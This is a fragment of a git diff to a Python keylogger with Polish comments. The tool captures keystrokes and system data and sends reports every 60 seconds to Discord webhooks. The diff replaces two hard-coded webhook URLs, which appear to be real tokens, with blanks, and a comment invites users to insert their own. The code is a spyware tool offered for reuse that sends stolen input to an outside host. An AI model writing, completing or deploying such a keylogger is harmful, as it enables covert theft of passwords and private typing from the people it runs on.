@@ -10,8 +10,8 @@ import keyboard
 from threading import Timer
 
 # Adresy webhooków Discord (wstaw swoje własne)
-SYSTEM_WEBHOOK_URL = "https://discord.com/api/webhooks/1346878894522892409/vUwNq3y0wWqIToksAfLSahHVLMxn1X3onliWbCdbcA9B7Xiil9foBGSEtSk_sg04ypwl"  # Dla danych systemowych
-KEYLOGGER_WEBHOOK_URL = "https://discord.com/api/webhooks/1346891173750636554/J3kKjhghWYb4u5hSD4qq_o1T-P6IFmkFviu3KmlN9PwkWBY8_aLcjphCyK4clJh172CG"  # Dla keyloggera
+SYSTEM_WEBHOOK_URL = " "  # Dla danych systemowych
+KEYLOGGER_WEBHOOK_URL = " "  # Dla keyloggera
 
 # Interwał wysyłania raportów keyloggera (w sekundach)
 SEND_REPORT_EVERY = 60
@@ -204,4 +204,5 @@ if __name__ == "__main__":
 
     # Uruchom keylogger w tle
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+
     keylogger.start()
